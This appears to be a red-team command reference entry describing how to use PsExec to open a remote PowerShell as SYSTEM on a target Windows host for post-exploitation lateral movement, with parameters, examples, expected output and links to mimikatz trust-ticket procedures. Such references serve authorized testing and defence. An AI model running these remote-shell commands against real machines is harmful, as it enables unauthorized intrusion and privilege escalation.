---
id: 1f9aa9d8-1075-468c-9a6c-7834e9529b39
name: psexec-spawn-powershell-prompt-as-system
type: command
executor: command_prompt
data: PsExec.exe -accepteula \\$_TARGET powershell.exe
output: |-
  C:\Tools\Sysinternals>PsExec.exe -accepteula \\WS01 powershell.exe

  PsExec v2.2 - Execute processes remotely
  Copyright (C) 2001-2016 Mark Russinovich
  Sysinternals - www.sysinternals.com

  Connecting to WS01...
  Starting powershell.exe on WS01...
  The command completed successfully.

  PS C:\Windows\system32> whoami
  nt authority\system
created_at: '2020-07-06T23:55:46.925292+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - remote-execution
  - privilege-escalation
verified: true
validated: true
---

# psexec-spawn-powershell-prompt-as-system

## Command

```command_prompt
PsExec.exe -accepteula \\$_TARGET powershell.exe
```

## Description

This command uses PsExec to remotely execute PowerShell on a target Windows machine, spawning an interactive prompt typically as SYSTEM if the authenticating credentials have administrative privileges. It leverages SMB for remote execution and is useful for post-exploitation lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target hostname or IP (e.g., WS01 or 192.168.1.10) | Yes |
| -accepteula | Automatically accepts the EULA on first run | Yes (for non-interactive) |
| powershell.exe | The executable to run remotely (spawns interactive shell) | Yes |

## Examples

### Basic Usage

```command_prompt
PsExec.exe -accepteula \\DC01 powershell.exe
```

### Advanced Usage

For non-interactive execution: PsExec.exe -accepteula \\$_TARGET cmd.exe /c "whoami > C:\output.txt"

## Expected Output

```
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Connecting to WS01...
Starting powershell.exe on WS01...
The command completed successfully.

PS C:\Windows\system32> whoami
nt authority\system
```

## Related

- [[procedures/Forge-Internal-Forest-Trust-Ticket-and-Escalate-to-Parent-DA-via-SIDHistory]]
- [[commands/mimikatz-forge-internal-ad-forest-trust-ticket]]
